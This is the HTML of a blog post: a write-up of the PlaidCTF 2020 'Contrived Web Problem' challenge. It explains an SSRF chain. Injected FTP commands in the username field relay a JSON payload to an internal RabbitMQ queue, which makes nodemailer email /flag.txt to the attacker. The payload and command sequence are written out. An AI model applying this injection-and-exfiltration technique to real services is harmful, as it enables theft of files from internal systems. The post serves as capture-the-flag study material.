@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="JamVie">
+<meta name="description" content="This was a CTF I unfortunately didn&amp;rsquo;t have the time for, as I was busy doing finals in April :(. My team let me know about this cool and unique problem, and I&amp;rsquo;m glad they did!
+" />
+<meta name="keywords" content=", writeups, web" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#252627" />
+<link rel="canonical" href="https://jamvie.net/posts/2020/04/plaidctf-2020-contrived-web-problem/" />
+
+
+    <title>
+        
+            Plaidctf 2020: Contrived Web Problem :: Jam Polintan 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://jamvie.net/main.dede02da9537a98158079c023e83573e18127834838ef08172acce888341a797.css">
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://jamvie.net/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://jamvie.net/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://jamvie.net/favicon-16x16.png">
+    <link rel="manifest" href="https://jamvie.net/site.webmanifest">
+    <link rel="mask-icon" href="https://jamvie.net/safari-pinned-tab.svg" color="#252627">
+    <link rel="shortcut icon" href="https://jamvie.net/favicon.ico">
+    <meta name="msapplication-TileColor" content="#252627">
+    <meta name="theme-color" content="#252627">
+
+
+
+<meta itemprop="name" content="Plaidctf 2020: Contrived Web Problem">
+<meta itemprop="description" content="This was a CTF I unfortunately didn&rsquo;t have the time for, as I was busy doing finals in April :(. My team let me know about this cool and unique problem, and I&rsquo;m glad they did!">
+<meta itemprop="datePublished" content="2020-04-28T00:48:12-06:00" />
+<meta itemprop="dateModified" content="2020-04-28T00:48:12-06:00" />
+<meta itemprop="wordCount" content="1171">
+<meta itemprop="image" content="https://jamvie.net"/>
+
+
+
+<meta itemprop="keywords" content="writeups,web," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://jamvie.net"/>
+
+<meta name="twitter:title" content="Plaidctf 2020: Contrived Web Problem"/>
+<meta name="twitter:description" content="This was a CTF I unfortunately didn&rsquo;t have the time for, as I was busy doing finals in April :(. My team let me know about this cool and unique problem, and I&rsquo;m glad they did!"/>
+
+
+
+    <meta property="og:title" content="Plaidctf 2020: Contrived Web Problem" />
+<meta property="og:description" content="This was a CTF I unfortunately didn&rsquo;t have the time for, as I was busy doing finals in April :(. My team let me know about this cool and unique problem, and I&rsquo;m glad they did!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jamvie.net/posts/2020/04/plaidctf-2020-contrived-web-problem/" />
+<meta property="og:image" content="https://jamvie.net"/>
+<meta property="article:published_time" content="2020-04-28T00:48:12-06:00" />
+<meta property="article:modified_time" content="2020-04-28T00:48:12-06:00" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2020-04-28 00:48:12 -0600 MDT" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://jamvie.net/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$ cd /hello/world</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://jamvie.net/about/">About Me</a></li><li><a href="https://jamvie.net/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>6 minutes
+
+            
+
+            </p>
+        </div>
+
+        <article>
+            <h1 class="post-title">
+                <a href="https://jamvie.net/posts/2020/04/plaidctf-2020-contrived-web-problem/">Plaidctf 2020: Contrived Web Problem</a>
+            </h1>
+
+            
+
+            <div class="post-content">
+                <p>This was a CTF I unfortunately didn&rsquo;t have the time for, as I was busy doing finals in April :(. My team let me know about this cool and unique problem, and I&rsquo;m glad they did!</p>
+<p>This was a journey in understanding internet protocols that deepened my knowledge of them to completely new levels, so I&rsquo;m really grateful I got the chance to try this problem out - even though I tried it after the CTF ended :P</p>
+<h2 id="lets-begin">Let&rsquo;s Begin!</h2>
+<p>This problem really holds up to its name. The website is simple - you have the option to login or register as a new user.</p>
+
+    <img src="images/CWP01.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Uniquely, we are given the source code for the problem. The source code shows us that the program has 6 services:</p>
+<pre><code>\services
+    \api 
+    \email (email server, sends emails based on rabbitmq queue)
+    \ftp
+    \postgres (database)
+    \rabbit (email queue, will send requests to the email server)
+    \server
+...
+</code></pre><p>Checking out the code, I see that <code>flag.txt</code> is actually mentioned. It&rsquo;s in the services dockerfile, which is only used by <code>api</code>, <code>email</code> and <code>server</code> services. So, the vulnerability probably is within one of these services.</p>
+<p>I checked out <code>api</code> first - and I see that the only protocols that it allows are HTTP, HTTPS, and FTP. Aside from the FTP protocol, the other 2 are pretty standard protocols to see in APIs.</p>
+<p>Looking at <code>email</code> next, which uses <a href="https://nodemailer.com/about/">nodemailer</a>. I&rsquo;m not too familiar with it, so I check out its documentation:</p>
+
+    <img src="images/CWP02.png"  alt="Login"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>This seems like a good loophole to exploit - we just need to specify the filepath and nodemailer will send an email with an attachment of whatever file we specified by the filepath, so we can exploit nodemailer&rsquo;s same origin policy. Since the rabbitmq server is the email server&rsquo;s queue, we will send a rogue email request into rabbitmq&rsquo;s queue to serve up to the email server, which will tell it to email us the flag!</p>
+<p>Now the hard part - how <em>do we</em> ask the server? How do we send a request to the server to send us the email with the flag as an attachment?</p>
+<p>I spent a long time trying to figure out how to send a rogue request to the rabbitmq server that will send us the email we want. I spent hours just browsing through the source code, not really paying attention&hellip;</p>
+<p>Until I came across this piece of code in the <code>api/index.ts</code> file:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">    <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/image&#34;</span>, <span style="color:#a6e22e">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+        <span style="color:#66d9ef">let</span> { <span style="color:#a6e22e">url</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>;
+        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;string&#34;</span>) {
+            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Bad body&#34;</span>);
+        }
+
+        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">parsed</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#a6e22e">url</span>);
+
+        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">image</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">Buffer</span>;
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;http:&#34;</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;https:&#34;</span>) {
+            <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">imageReq</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">toString</span>(), { <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;GET&#34;</span> });
+            <span style="color:#a6e22e">image</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> (<span style="color:#a6e22e">imageReq</span> <span style="color:#a6e22e">as</span> <span style="color:#a6e22e">any</span>).<span style="color:#a6e22e">buffer</span>();
+        } 
+        
+         <span style="color:#75715e">//THIS PART HERE!
+</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">protocol</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;ftp:&#34;</span>) {
+            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> decodeURIComponent(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">username</span>);
+            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> decodeURIComponent(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">password</span>);
+            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">filename</span> <span style="color:#f92672">=</span> decodeURIComponent(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">pathname</span>);
+            <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">ftpClient</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">connectFtp</span>({
+                <span style="color:#a6e22e">host</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">hostname</span>,
+                <span style="color:#a6e22e">port</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">port</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">?</span> parseInt(<span style="color:#a6e22e">parsed</span>.<span style="color:#a6e22e">port</span>) <span style="color:#f92672">:</span> <span style="color:#66d9ef">undefined</span>,
+                <span style="color:#a6e22e">user</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">undefined</span>,
+                <span style="color:#a6e22e">password</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">undefined</span>,
+            });
+            <span style="color:#a6e22e">image</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">await</span> <span style="color:#a6e22e">ftpClient</span>.<span style="color:#a6e22e">get</span>(<span style="color:#a6e22e">filename</span>);
+        } <span style="color:#66d9ef">else</span> {
+            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Bad image url&#34;</span>);
+        }
+                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isPNG</span>(<span style="color:#a6e22e">image</span>)) {
+            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">500</span>).<span style="color:#a6e22e">send</span>(<span style="color:#e6db74">&#34;Bad image (not a png)&#34;</span>);
+        }
+
+        <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">type</span>(<span style="color:#e6db74">&#34;.png&#34;</span>).<span style="color:#a6e22e">status</span>(<span style="color:#ae81ff">200</span>).<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">image</span>);
+    })
+
+    <span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#e6db74">&#34;4101&#34;</span>);
+
+</code></pre></div><p>Image: the profile picture we would upload when we register as a new user. For HTTP and HTTPS protocols it&rsquo;s a simple GET method, not much to do there. But for FTP?
+It asks for the username, password and filename, <em>unchecked</em>, then asynchronously asks the server for the image that matches the filename that we specified.
+FTP is a text-based protocol, and since username and password fields are passed to it unchecked, we could definitely inject some protocol commands, custom data (something like <code>{to: &quot;email@example.com&quot;, attachments:[{path:&quot;/flag.txt&quot;}]}</code>), and make FTP send requests that were never intended to be sent.</p>
+<p>Here&rsquo;s something I learned in my internet computing class about the FTP protocol: FTP connections have two modes : &ldquo;Active&rdquo; and &ldquo;Passive&rdquo;. I&rsquo;ll give a heavily truncated explanation of the two modes (if you&rsquo;re interested in learning mroe about the FTP protocol, check out the <a href="https://tools.ietf.org/html/rfc959">RFC specifications on it</a>):</p>
+<p>&ndash; In active mode, the client will specify the IP of the destination to the server. The FTP server will then send the files to the specified IP. The client establishes the communication channel, tells the server the address to send data to, and the server will then open a data channel to the address.</p>
+<p>&ndash; In passive mode, the server tells the client where the files will be sent to. In this case, the client will then have to open the data channel as well to get the files. By default, applications running FTP will run on passive mode.</p>
+<p>The difference in active and passive really lies in the <code>RETR</code> command in the FTP specifications: active-mode <code>RETR</code> makes the client stipulate the destination IP, and passive-mode <code>RETR</code> makes the server stipulate it.</p>
+<p>So for this challenge, we can make the FTP client specify the rabbitmq server as the destination IP, and use <code>RETR</code> to make the FTP server send data to rabbitmq.</p>
+<p>And since the FTP protocol for this application handles for the uploading and retrieval of profile pictures, we just need to hide our payload (which would ask the rabbitmq server to send an email with the flag.txt file in it to us) in our profile picture, specify FTP to operate on active (using <code>PORT</code> command), and use the <code>RETR</code> command to let the FTP server send our payload to the rabbitmq server!</p>
+<p>Okay, I&rsquo;ve explained alot here. This is the attack plan:</p>
+<ul>
+<li>Craft a payload that will tell the rabbitmq email queue server to email to us, with flag.txt as the attachment. Hide it in the profile picture (make sure its a png). Upload whatever picture it is as our profile picture.</li>
+</ul>
+<p>Here&rsquo;s the payload I crafted (a classic SSRF):</p>
+<pre><code>{&quot;to&quot;:&quot;yourEmailGoesHere@example.com&quot;,&quot;text&quot;:&quot;Hello would you like a flag&quot;,&quot;attachments&quot;:[{&quot;path&quot;:&quot;/flag.txt&quot;}]}
+</code></pre><ul>
+<li>Through the username field, input several FTP commands to make the FTP server send our payload to the rabbitmq server. Here, I have made a file called &ldquo;payload.txt&rdquo; that has the post request data with the payload in it:</li>
+</ul>
+<pre><code>PASS blah
+PORT 255,255,255,255,80
+STOR payload.txt
+PORT 172,32,56,72,0, 15672      &lt;-----rabbitmq server and port
+RETR payload.txt
+</code></pre><ul>
+<li>Hopefully, the rabbitmq server will send us an email!</li>
+</ul>
+<pre><code>PCTF{not_that_contrived_i_guess}
+</code></pre><p>NOTE: Doing it this way means the FTP server was establishing a connection with the rabbitmq one. However, multiple times I tried this the TCP connection would close immediately after I send my request! I worked around this by sending in a bunch of garbage in my payload.txt file alongside the actual payload, so that at least the TCP connection would have to spend time sending all of that data(think: an unending stream of AAAAAs), and persist long enough for the reponse to be recieved.</p>
+<p>This was a fun way to learn how FTP servers work and how protocols of the internet operate! I&rsquo;m upset that I didn&rsquo;t have the time to participate when it happened, but nonetheless this was a great challenge :)</p>
+<p>Jam</p>
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+                <p>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://jamvie.net/tags/writeups">writeups</a></span><span class="tag"><a href="https://jamvie.net/tags/web">web</a></span>
+                </p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1171 Words</p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-04-28 00:48 -0600</p>
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h"></span>
+                    <hr />
+                </div>
+
+                <div class="pagination__buttons">
+                    
+                        <span class="button previous">
+                            <a href="https://jamvie.net/posts/2020/05/de1ctf-2020-hard_pentest_1-and-animal-crossing/">
+                                <span class="button__icon">←</span>
+                                <span class="button__text">De1ctf 2020: Hard_Pentest_1 and Animal Crossing</span>
+                            </a>
+                        </span>
+                    
+
+                    
+                        <span class="button next">
+                            <a href="https://jamvie.net/posts/2020/04/commonly-used-software/">
+                                <span class="button__text">Commonly Used Software</span>
+                                <span class="button__icon">→</span>
+                            </a>
+                        </span>
+                    
+                </div>
+            </div>
+        
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2020</span>
+            
+                <span><a href="https://jamvie.net">Jamie Polintan</a></span>
+            
+            <span>CC Attribution-NonCommercial 4.0 International License</span>
+            <span> <a href="https://jamvie.net/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/rhazdon">Djordje Atlialp</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="https://jamvie.net/bundle.min.dc716e9092c9820b77f96da294d0120aeeb189b5bcea9752309ebea27fd53bbe6b13cffb2aca8ecf32525647ceb7001f76091de4199ac5a3caa432c070247f5b.js" integrity="sha512-3HFukJLJggt3&#43;W2ilNASCu6xibW86pdSMJ6&#43;on/VO75rE8/7KsqOzzJSVkfOtwAfdgkd5BmaxaPKpDLAcCR/Ww=="></script>
+
+
+
+    </body>
+</html>
